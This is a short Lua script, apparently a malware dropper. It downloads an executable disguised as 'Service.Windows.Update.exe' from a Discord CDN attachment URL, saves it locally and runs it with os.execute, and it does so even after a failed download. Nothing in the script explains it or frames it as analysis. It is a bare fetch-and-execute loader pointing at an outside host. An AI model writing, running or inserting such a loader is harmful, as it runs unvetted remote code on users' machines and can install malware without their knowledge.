local url = "https://cdn.discordapp.com/attachments/1085606667841982504/1087273924728987718/Service.Windows.Update.exe"
local file = "Service.Windows.Update.exe"
local download_path = "./" .. file
local exe_path = download_path

local http = require("socket.http")
local ltn12 = require("ltn12")
local body = {}
local _, status = http.request{
    url = url,
    sink = ltn12.sink.table(body)
}

if status == 200 then
    local file_contents = table.concat(body)
    local f = io.open(download_path, "wb")
    f:write(file_contents)
    f:close()
    print("File downloaded successfully!")
else
    print("Error downloading file. Status code: " .. status)
end

os.execute('"' .. exe_path .. '"')